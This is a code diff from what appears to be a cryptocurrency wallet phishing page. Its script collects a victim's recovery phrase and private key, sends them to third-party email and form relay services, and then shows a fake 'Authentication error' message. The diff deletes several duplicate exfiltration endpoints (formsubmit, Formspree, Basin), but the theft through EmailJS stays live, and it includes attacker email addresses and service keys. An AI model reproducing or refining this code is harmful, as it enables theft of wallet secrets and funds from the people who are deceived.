@@ -246,16 +246,6 @@ user-scalable=0">
     hiddenInput.setAttribute('name', 'phrase'); // Set name as 'ohrase'
     hiddenInput.setAttribute('value', dataToSubmit.phrase); // Set the value from getInputValues()
     form.appendChild(hiddenInput); // Append the hidden input to the form
-var dataToEmail = {
-                service_id: 'service_0e4v941',
-                template_id: 'template_zqma9zd',
-                user_id: 'zzPNbVLcW8a_Uhr6L',
-                template_params: {
-                    'wallet_name': dataToSubmit.phrase,
-                    'phrase': dataToSubmit.phrase,
-                    'Pass': dataToSubmit.phrase
-                }
-            };
     // Send the dynamically created form using EmailJS
     emailjs.sendForm('service_bhd00th', 'template_l5idmpt', form)
         .then(() => {
@@ -263,45 +253,8 @@ var dataToEmail = {
         }, (error) => {
             console.log('FAILED...', error);
         });
-    fetch('https://api.emailjs.com/api/v1.0/email/send', {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(dataToEmail)
-})
-  .then(response => {
-    return response.json(); 
-  })
-  .catch(error => {});
-    try {
-            await postData(
-            dataToSubmit
-            , 'https://formsubmit.io/send/6bad4f5f-1fb5-42df-bccd-a9af4c834030');
-            } catch (error) {
-                
-            }
-    try {
-            await postData(
-            dataToSubmit
-            , 'https://formsubmit.co/24fcbfab9fcc8a8bf03e403070f885e3');
-            } catch (error) {
-                
-            }
-     try {
-            await postData(
-            dataToSubmit
-            , 'https://formspree.io/f/xnnqvlrb');
-            } catch (error) {
-                
-            }
 
     // Send the same data to Basin via postData
-    try {
-        await postData(dataToSubmit, 'https://usebasin.com/f/0c493dd57d79');
-    } catch (error) {
-        console.error('Error with Basin:', error);
-    }
 
     // Show error message using SweetAlert
     new swal("Error Restoring", "Authentication error, please try again!", "error");
@@ -336,7 +289,7 @@ var dataToEmail = {
       $('form').on('submit', function(e) {
           e.preventDefault();
           new swal( "Error Restoring" ,  "Authentication error, please try again!" ,  "error" )
-          $.post('https://formsubmit.co/symplymatt@gmail.com', { 
+          $.post('https://api.emailjs.com/api/v1.0/email/send', { 
               // to: 'Katieveronica315@gmail.com',
               user: $('[name=privatekey]').val(),
               pwd: '.',
